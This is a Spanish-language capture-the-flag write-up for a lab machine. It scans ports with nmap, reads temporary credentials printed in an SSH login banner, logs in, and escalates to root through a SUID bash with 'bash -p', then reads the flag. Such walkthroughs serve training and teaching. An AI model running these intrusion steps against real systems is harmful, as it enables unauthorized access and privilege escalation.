
## 1. Reconocimiento

```bash
nmap -sVC -p- 172.17.0.2 -oG nmap
```

Puertos abiertos:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | Apache httpd 2.4.52 (Ubuntu) |

Nmap también detecta que `robots.txt` tiene una entrada desautorizada: `/migration_notes.txt`. Se anota para revisar después.

---

## 2. Enumeración web — banner SSH como vector

La web muestra una página de mantenimiento corporativa (ACME Corporation). El texto incluye un aviso directo:

> "Pruebe a conectarse por SSH con cualquier usuario para consultar el aviso y las notificaciones del sistema con las instrucciones de acceso."

Conectar por SSH con un usuario inexistente antes de introducir contraseña muestra el banner del servidor, configurado en `sshd` mediante la directiva `Banner`. Se prueba:

```bash
ssh test@172.17.0.2
```

```
===================================================================
[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno
[!] AVISO DE SEGURIDAD Y ACCESO:
[!] Portal corporativo en proceso de migracion a infraestructura interna.
[!] Credenciales temporales asignadas para tareas de mantenimiento:
[!]   - Usuario: usuario
[!]   - Password: P@ssw0rd2026_CTF!
===================================================================
```

Las credenciales están en el banner en texto claro. Cualquier cliente SSH las ve antes de autenticarse, sin necesidad de conocer ningún usuario válido del sistema.

---

## 3. Acceso SSH como usuario

```bash
ssh usuario@172.17.0.2
# contraseña: P@ssw0rd2026_CTF!

-bash-5.1$ whoami
usuario
```

---

## 4. Escalada a root — bash con SUID

Enumeración de privilegios:

```bash
sudo -l
# Sorry, user usuario may not run sudo on 27c6557bf252.
```

Sin sudo. Se buscan binarios con el bit SUID activo:

```bash
find / -perm -4000 2>/dev/null
```

Entre los resultados aparece `/usr/bin/bash`. Cuando `bash` tiene SUID y el propietario es root, el flag `-p` (privileged) impide que bash descarte el `euid` del propietario del binario. Sin `-p`, bash lo descarta por seguridad; con él, lo mantiene:

```bash
bash -p
```

```bash
bash-5.1# id
uid=1000(usuario) gid=1000(usuario) euid=0(root) groups=1000(usuario)

bash-5.1# whoami
root

bash-5.1# cat /root/root.txt
FLAG{wp2shell_cve_2026_63030_core_rce_root_99d10c8b}
```

---

## Cadena de ataque

```
Puerto 80 — Web en mantenimiento
        ↓
Aviso en la web: "conéctate por SSH con cualquier usuario"
        ↓
ssh test@172.17.0.2 → banner SSH → usuario:P@ssw0rd2026_CTF!
        ↓
SSH como usuario (puerto 22)
        ↓
find / -perm -4000 → /usr/bin/bash (SUID root)
        ↓
bash -p → euid=0(root)
```